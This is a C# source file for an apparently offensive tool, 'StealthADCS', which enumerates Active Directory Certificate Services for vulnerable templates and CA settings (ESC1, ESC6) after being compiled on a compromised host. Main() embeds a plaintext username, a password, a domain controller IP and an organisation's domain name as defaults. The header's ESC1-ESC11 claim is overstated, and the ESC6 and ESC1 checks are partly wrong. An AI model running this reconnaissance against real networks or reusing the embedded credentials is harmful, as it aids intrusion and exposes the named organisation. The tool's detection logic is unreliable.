// StealthADCS.cs - AD CS (Certificate Services) enumeration, custom C# (no third-party libs).
// Finds vulnerable certificate templates (ESC1-ESC11).
// Compile on-box:
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:%TEMP%\c.exe /r:System.DirectoryServices.dll StealthADCS.cs
//   %TEMP%\c.exe > %TEMP%\adcs.log 2>&1
//
using System;
using System.DirectoryServices;
using System.Collections.Generic;

class StealthADCS {
  static void H(string t){ Console.WriteLine("\n====== "+t+" ======"); }
  
  static string GetNC(){
    try{ 
      using(var root=new DirectoryEntry("LDAP://rootDSE")){
        return (string)root.Properties["defaultNamingContext"][0];
      }
    }catch{ return "DC=lioncapital,DC=local"; }
  }

  static string[] ResolvePrincipals(byte[] sidBytes, string user, string pass, string dc, string nc) {
    // Look up SID -> name via LDAP
    try {
      string sid = ConvertSIDToString(sidBytes);
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/"+nc, user, pass, AuthenticationTypes.Secure))
      using (var s = new DirectorySearcher(entry)) {
        s.Filter = "(objectSid=" + sid + ")";
        s.PropertiesToLoad.Add("sAMAccountName");
        SearchResult r = s.FindOne();
        if (r != null) return new string[] { (string)r.Properties["sAMAccountName"][0] };
      }
    } catch {}
    return new string[] { };
  }
  
  static string ConvertSIDToString(byte[] sid) {
    // Simple SID string conversion
    try {
      var s = new System.Security.Principal.SecurityIdentifier(sid, 0);
      return s.Value;
    } catch { return ""; }
  }

  static void Main(string[] args) {
    string user = args.Length > 0 ? args[0] : "lsg122b";
    string pass = args.Length > 1 ? args[1] : @"EFveryFun08$";
    string dc   = args.Length > 2 ? args[2] : "10.19.8.102";
    string nc = GetNC();

    H("CONFIG");
    Console.WriteLine("User: "+user);
    Console.WriteLine("DC:   "+dc);

    H("ENTERPRISE CA SERVERS");
    try {
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/CN=Configuration,"+nc, user, pass, AuthenticationTypes.Secure))
      using (var s = new DirectorySearcher(entry)) {
        s.Filter = "(objectClass=pKIEnrollmentService)";
        s.PropertiesToLoad.Add("cn");
        s.PropertiesToLoad.Add("dNSHostName");
        s.PropertiesToLoad.Add("certificateTemplates");
        
        foreach (SearchResult r in s.FindAll()) {
          string name = (string)r.Properties["cn"][0];
          string host = r.Properties["dNSHostName"].Count > 0 ? (string)r.Properties["dNSHostName"][0] : "?";
          Console.WriteLine("  [CA] " + name + " @ " + host);
          
          if (r.Properties["certificateTemplates"].Count > 0) {
            foreach (object t in r.Properties["certificateTemplates"]) {
              Console.WriteLine("       -> template: " + t);
            }
          }
        }
      }
    } catch (Exception ex) { Console.WriteLine("  [!] " + ex.Message); }

    H("CERTIFICATE TEMPLATES - INSECURE ENROLLMENT FLAGS");
    try {
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/CN=Configuration,"+nc, user, pass, AuthenticationTypes.Secure))
      using (var s = new DirectorySearcher(entry)) {
        s.Filter = "(objectClass=pKICertificateTemplate)";
        s.PropertiesToLoad.Add("cn");
        s.PropertiesToLoad.Add("displayName");
        s.PropertiesToLoad.Add("msPKI-Template-Schema-Version");
        s.PropertiesToLoad.Add("msPKI-Certificate-Name-Flag");
        s.PropertiesToLoad.Add("msPKI-Enrollment-Flag");
        s.PropertiesToLoad.Add("msPKI-RA-Signature");
        s.PropertiesToLoad.Add("pKIExtendedKeyUsage");
        s.PropertiesToLoad.Add("ntSecurityDescriptor");
        s.PageSize = 1000;
        s.SizeLimit = 0;

        int total = 0, vulnerable = 0;
        foreach (SearchResult r in s.FindAll()) {
          string name = r.Properties["cn"].Count > 0 ? (string)r.Properties["cn"][0] : "?";
          string display = r.Properties["displayName"].Count > 0 ? (string)r.Properties["displayName"][0] : "";
          
          int nameFlag = r.Properties["msPKI-Certificate-Name-Flag"].Count > 0 ? (int)r.Properties["msPKI-Certificate-Name-Flag"][0] : 0;
          int enrollFlag = r.Properties["msPKI-Enrollment-Flag"].Count > 0 ? (int)r.Properties["msPKI-Enrollment-Flag"][0] : 0;
          int raSig = r.Properties["msPKI-RA-Signature"].Count > 0 ? (int)r.Properties["msPKI-RA-Signature"][0] : 0;
          
          string ekus = "";
          if (r.Properties["pKIExtendedKeyUsage"].Count > 0) {
            foreach (object eku in r.Properties["pKIExtendedKeyUsage"])
              ekus += eku.ToString() + ", ";
          }
          
          // ESC1 = ENROLLEE_SUPPLIES_SUBJECT (nameFlag & 0x1) + no EKU
          // ESC6 = EDITF_ATTRIBUTESUBJECTALTNAME2 set on CA (we'd check CA not template)
          bool isEsc1 = (nameFlag & 0x1) != 0 && string.IsNullOrEmpty(ekus) && raSig == 0;
          
          if (isEsc1) {
            Console.WriteLine("  [!] ESC1 VULNERABLE: " + name + " (" + display + ")");
            vulnerable++;
          }
          
          total++;
        }
        Console.WriteLine("  Total templates: " + total);
        Console.WriteLine("  ESC1 candidates: " + vulnerable);
      }
    } catch (Exception ex) { Console.WriteLine("  [!] " + ex.Message); }

    H("CA FLAGS (EDITF_ATTRIBUTESUBJECTALTNAME2 = ESC6)");
    try {
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/CN=Configuration,"+nc, user, pass, AuthenticationTypes.Secure))
      using (var s = new DirectorySearcher(entry)) {
        s.Filter = "(objectClass=pKIEnrollmentService)";
        s.PropertiesToLoad.Add("cn");
        s.PropertiesToLoad.Add("flags");
        s.PropertiesToLoad.Add("cACertificate");

        foreach (SearchResult r in s.FindAll()) {
          string name = (string)r.Properties["cn"][0];
          int flags = r.Properties["flags"].Count > 0 ? (int)r.Properties["flags"][0] : 0;
          // EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00080000
          bool esc6 = (flags & 0x00080000) != 0;
          Console.WriteLine("  [CA] " + name + " flags=0x" + flags.ToString("X8") + (esc6 ? " <- EDITF_ATTRIBUTESUBJECTALTNAME2 set (ESC6 vulnerable!)" : ""));
        }
      }
    } catch (Exception ex) { Console.WriteLine("  [!] " + ex.Message); }
    
    H("END");
  }
}
